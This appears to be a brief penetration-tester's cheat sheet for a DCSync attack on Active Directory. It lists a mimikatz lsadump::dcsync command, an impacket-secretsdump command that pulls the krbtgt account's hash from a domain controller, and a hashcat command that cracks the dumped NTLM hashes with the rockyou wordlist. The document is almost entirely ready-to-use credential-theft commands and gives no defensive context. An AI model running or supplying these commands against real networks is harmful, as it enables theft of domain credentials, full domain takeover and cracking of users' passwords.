# DCSYNC
#mimikatz 
```
lsadump::dcsync /user:[domain]\[user]
```

#impacket-secretsdumps
```
impacket-secretsdump -just-dc-user krbtgt [domain]/[user]:"[password]"@[ip]
```

#crack 
```
hashcat -m 1000 [dcsync hashes file] /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```